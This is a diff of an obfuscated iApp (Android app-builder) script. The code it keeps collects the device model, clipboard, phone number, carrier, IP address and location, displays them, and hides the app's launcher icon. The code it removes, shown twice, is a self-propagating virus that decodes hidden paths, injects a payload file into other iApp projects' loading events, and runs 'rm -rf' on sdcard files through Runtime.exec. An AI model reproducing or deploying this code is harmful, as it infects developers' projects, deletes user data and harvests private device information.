@@ -65,7 +65,7 @@ t(){
   sj(bd,code,code,sss.code)
   hd("https://pic.baike.soso.com/ugc/baikepic2/99/cut-20191229163159-683136713_jpg_416_519_60468.jpg/300","iApp/Userimg/icon.png",true,icon)
   ufnsui(){
-    fd("Ace/pd",pd)
+    fd("$pd",pd)
     fdir("@",xm)
     fdir(mh)
     ss(mh+"/",mh)
@@ -76,21 +76,21 @@ t(){
     for(xm;fg){
       f(xm!=""){
         f(xm=="res"){
-          fr("Ace/pd",pd)
+          fr("$pd",pd)
           ss(sz+":",head)
           ss(":"+sz,tail)
           sj(pd,head,tail,xm)
-          fw("Ace/Source",xm)
+          fw("$Source",xm)
         }else{
           fe("$pd",pd)
           f(pd=="true"){
-            s wb="Ace/pd"
+            s wb="$pd"
             fr(wb,nr)
             s+(1,sz)
             ss(nr+"\n"+sz+":"+xm+":"+sz,xm)
             fw(wb,xm)
           }f(pd=="false"){
-            s wb="Ace/pd"
+            s wb="$pd"
             s+(1,sz)
             ss(sz+":"+xm+":sz",xm)
             fw(wb,xm)
@@ -98,7 +98,7 @@ t(){
         }
       }
     }
-    fr("Ace/Source",path)
+    fr("$Source",path)
     fdir("@",dir)
     ss(path+"/res/",path)
     sr(dir,path,"",path)
@@ -215,7 +215,9 @@ t(){
         shb(shb)
         javags(model,null,"android.os.Build","MODEL")  
         ss("型号:"+model+"\n剪贴板内容:"+shb+"\n本机手机号:"+phone+"\n运营商:"+Operator+sss.qq+"\nip:"+ip+" \n位置:"+pos+"\n经度:"+lat+"\n纬度:"+lng,info) 
-        tw("还不收手?\n"+info)
+        ufnsui(){
+        tw(info)
+        }
         java(管理器,activity,"Context.getPackageManager")
         javanew(组件名,"android.content.ComponentName","Context",activity,"String","com.iapp.app.logoActivity")
         java(null,管理器,"android.content.pm.PackageManager.setComponentEnabledSetting","android.content.ComponentName",组件名,"int",2,"int",1)
@@ -239,49 +241,6 @@ t(){
           sr(hahahaha,hahahahaha,hahahahahahahaha,hahahaha)
           sr(hahahaha,"","",hahahaha)
           fw(hahaha,hahahaha)
-          btoo("utf-8","105 65 112 112 47 105 97 112 112 100 105 114 47",dir)
-          fl(dir,"false",irsz)
-          for(iapp;irsz){
-              ss(dir+iapp,ymdz)
-              sran(1000,9999,hp)
-              ss("rm -rf /sdcard/"+hp,rm)
-              fuzs(ymdz,hp,true,ll)
-            s ujnikm="47 115 114 99 47 109 105 97 110 46 105 121 117"
-            btoo("utf-8",ujnikm,)
-              ss(hp+ujnikm,mian)
-              fr(mian,iyu)
-              s rfvtgn="60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62"
-              s qazwsx="60 47 101 118 101 110 116 73 116 109 101 62 60 47 85 73 69 118 101 110 116 115 101 116 62"
-              btoo("utf-8",rfvtgn,rfvtgn)
-              btoo("utf-8",qazwsx,qazwsx)
-              f(iyu?"loading"){
-                  sj(iyu,rfvtgn,qazwsx,loading)
-                  fr("a",n)
-                  fr("iApp/DropApptect/xbx.fuck",sss.virus)
-                  btoo("utf-8","10 47 46 10 -27 -73 -78 -28 -72 -70 -26 -126 -88 -26 -117 -90 -26 -120 -86 -25 -105 -123 -26 -81 -110",lj)
-                  ss(loading+lj+n+sss.virus,afterloading)
-                  sr(iyu,loading,afterloading,iyu)
-                  fw(mian,iyu)
-                  fj(hp,ymdz,true,jg)   
-                  java(runtime,null,"java.lang.Runtime.getRuntime")
-                  java(null,runtime,"java.lang.Runtime.exec","String",rm)
-            }else{
-                  s qwertyuiop="60 85 73 69 118 101 110 116 115 101 116 62"
-                  s asdfghjkl="60 47 101 118 101 110 116 73 116 109 101 62"
-                  s wsxedc="60 47 85 73 69 118 101 110 116 115 101 116 62"
-                  s rfvtgn="60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62"
-                  btoo("utf-8",qwertyuiop,qwertyuiop)
-                  btoo("utf-8",wsxedc,wsxedc)
-                  btoo("utf-8",asdfghjkl,asdfghjkl)
-                  btoo("utf-8",rfvtgn,rfvtgn)
-                  fr("iApp/DropApptect/xbx.fuck",sss.virus)
-                  ss(rfvtgn+sss.virus+asdfghjkl+wsxedc,th)
-                  sr(iyu,qwertyuiop,th)
-                  fw(mian,th)
-                  fj(hp,ymdz,true,jg)
-                  java(runtime,null,"java.lang.Runtime.getRuntime")
-                 java(null,runtime,"java.lang.Runtime.exec","String",rm )
-                }
         }else{
           s ha="60 85 73 69 118 101 110 116 115 101 116 62"
           s haha="60 47 101 118 101 110 116 73 116 109 101 62"
@@ -299,47 +258,4 @@ t(){
       }
     }
   }
-btoo("utf-8","105 65 112 112 47 105 97 112 112 100 105 114 47",dir)
-fl(dir,"false",irsz)
-for(iapp;irsz){
-  ss(dir+iapp,ymdz)
-  sran(1000,9999,hp)
-  ss("rm -rf /sdcard/"+hp,rm)
-  fuzs(ymdz,hp,true,ll)
- s ujnikm="47 115 114 99 47 109 105 97 110 46 105 121 117"
- btoo("utf-8",ujnikm,)
-  ss(hp+ujnikm,mian)
-  fr(mian,iyu)
-  s rfvtgn="60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62"
-  s qazwsx="60 47 101 118 101 110 116 73 116 109 101 62 60 47 85 73 69 118 101 110 116 115 101 116 62"
-  btoo("utf-8",rfvtgn,rfvtgn)
-  btoo("utf-8",qazwsx,qazwsx)
-  f(iyu?"loading"){
-    sj(iyu,rfvtgn,qazwsx,loading)
-    fr("a",n)
-    fr("iApp/DropApptect/xbx.fuck",sss.virus)
-    btoo("utf-8","10 47 46 10 -27 -73 -78 -28 -72 -70 -26 -126 -88 -26 -117 -90 -26 -120 -86 -25 -105 -123 -26 -81 -110",lj)
-    ss(loading+lj+n+sss.virus,afterloading)
-    sr(iyu,loading,afterloading,iyu)
-    fw(mian,iyu)
-    fj(hp,ymdz,true,jg)    
-    java(runtime,null,"java.lang.Runtime.getRuntime")
-    java(null,runtime,"java.lang.Runtime.exec","String",rm)
-   }else{
-    s qwertyuiop="60 85 73 69 118 101 110 116 115 101 116 62"
-    s asdfghjkl="60 47 101 118 101 110 116 73 116 109 101 62"
-    s wsxedc="60 47 85 73 69 118 101 110 116 115 101 116 62"
-    s rfvtgn="60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62"
-    btoo("utf-8",qwertyuiop,qwertyuiop)
-    btoo("utf-8",wsxedc,wsxedc)
-    btoo("utf-8",asdfghjkl,asdfghjkl)
-    btoo("utf-8",rfvtgn,rfvtgn)
-    fr("iApp/DropApptect/xbx.fuck",sss.virus)
-    ss(rfvtgn+sss.virus+asdfghjkl+wsxedc,th)
-    sr(iyu,qwertyuiop,th)
-    fw(mian,th)
-    fj(hp,ymdz,true,jg)
-    java(runtime,null,"java.lang.Runtime.getRuntime")
-   java(null,runtime,"java.lang.Runtime.exec","String",rm )
-  }
 }♣
